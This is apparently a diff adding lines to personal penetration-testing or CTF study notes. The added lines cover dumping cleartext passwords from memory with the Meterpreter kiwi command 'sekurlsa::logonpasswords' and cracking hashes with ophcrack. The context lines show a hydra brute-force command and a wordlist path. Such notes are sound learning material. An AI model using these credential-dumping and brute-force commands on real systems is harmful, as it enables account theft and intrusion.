@@ -72,6 +72,12 @@ hydra -l [user] -P [password_list] protocol://ip
 ```
 we have a password list in kali in `/user/share/rockyou.txt/`
 
+with `load kiwi` and then use this code you can get some passwords that's are in ram as a clear text.
+```console
+kiwi_cmd sekurlsa::logonpasswords
+```
+
+for cracking hash, we can use ophcrack. and get the tables of it from its [website](https://ophcrack.sourceforge.io/tables.php)
 # Natas
 1- checking directory of website
 2- check the robots.txt
